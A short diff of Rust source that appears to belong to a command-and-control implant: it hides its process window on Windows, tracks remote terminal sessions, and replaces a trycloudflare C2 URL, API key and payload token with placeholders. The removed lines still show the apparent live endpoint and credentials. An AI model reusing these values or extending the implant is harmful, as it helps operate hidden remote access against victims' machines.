@@ -12,9 +12,9 @@ use std::os::windows::process::CommandExt;
 #[cfg(target_os = "windows")]
 const CREATE_NO_WINDOW: u32 = 0x08000000;
 
-const C2_URL: &str = "https://canyon-dec-next-acrylic.trycloudflare.com";
-const API_KEY: &str = "195bf5d2935f565ed1c77f9bab886f90";
-const PAYLOAD_TOKEN: &str = "7e963bc6aea064ff7f6926747cec6a15";
+const C2_URL: &str = "https://CHANGE-ME.trycloudflare.com";
+const API_KEY: &str = "00000000000000000000000000000000";
+const PAYLOAD_TOKEN: &str = "00000000000000000000000000000000";
 
 static PTY_RUNNING: AtomicBool = AtomicBool::new(false);
 static PTY_SESSION_ID: AtomicU64 = AtomicU64::new(0);
